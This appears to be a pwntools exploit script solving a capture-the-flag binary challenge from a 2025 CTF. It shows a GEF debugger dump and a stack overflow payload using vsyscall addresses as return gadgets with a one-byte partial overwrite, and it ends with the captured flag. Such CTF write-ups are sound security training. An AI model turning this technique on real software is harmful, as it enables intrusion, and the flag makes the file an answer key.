
# A custom template for binary exploitation that uses pwntools.
# Examples:
#   python exploit.py DEBUG NOASLR GDB
#   python exploit.py DEBUG REMOTE

from pwn import *

context.binary = elfexe = ELF('./chall')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([elfexe.path] + argv, gdbscript, elfexe.path, *a, *kw)
    else:
        target = process([elfexe.path] + argv, *a, **kw)
    return target

gdbscript = '''
b *(main+0x72)
'''.format(**locals())
if args.GDB:
    log.info('Using gdb script:\n'+gdbscript)

arguments = []
if args['REMOTE']:
    remote_server = 'virtual.ctf.theromanxpl0.it'
    remote_port = 7011
    io = remote(remote_server, remote_port)
else:
    io = start(arguments)


"""
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555242 <main+104>       call   0x5555555550a0 <read@plt>
   0x555555555247 <main+109>       mov    eax, 0x0
   0x55555555524c <main+114>       leave
 → 0x55555555524d <main+115>       ret
[!] Cannot disassemble from $PC
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall", stopped 0x55555555524d in main (), reason: SINGLE STEP
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55555555524d → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/1gx $sp
0x7fffffffd3e8: 0x4343434343434343
gef➤  telescope $sp
0x00007fffffffd3e8│+0x0000: "CCCCCCCC"   ← $rsp
0x00007fffffffd3f0│+0x0008: 0x0000000000000000
0x00007fffffffd3f8│+0x0010: 0x00005555555551da  →  <main+0> endbr64
0x00007fffffffd400│+0x0018: 0x0000000100000000
0x00007fffffffd408│+0x0020: 0x00007fffffffd4f8  →  0x00007fffffffd947  →  "/home/nikos/ctfs/vm-tmp-shared/trx2025/virtual_ins[...]"
0x00007fffffffd410│+0x0028: 0x0000000000000000
0x00007fffffffd418│+0x0030: 0x4916cb74340734b1
0x00007fffffffd420│+0x0038: 0x00007fffffffd4f8  →  0x00007fffffffd947  →  "/home/nikos/ctfs/vm-tmp-shared/trx2025/virtual_ins[...]"
0x00007fffffffd428│+0x0040: 0x00005555555551da  →  <main+0> endbr64
0x00007fffffffd430│+0x0048: 0x0000555555557da8  →  0x0000555555555160  →  <__do_global_dtors_aux+0> endbr64


0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]

0xffffffffff600000:  mov    rax,0x60
0xffffffffff600007:  syscall
0xffffffffff600009:  ret
"""

io.recvline()

payload  = b'A'*0x20
payload += b'B'*0x8 # rbp
# payload += b'C'*0x8 # pc

# vsyscall acts as a noop gadget
payload += p64(0xffffffffff600000) # pc
payload += p64(0xffffffffff600000)
payload += b"\xa9" # partial overwrite to win

io.send(payload)

io.interactive()
io.close()

# TRX{1_h0p3_y0u_d1dn7_bru73f0rc3_dc85efe0}
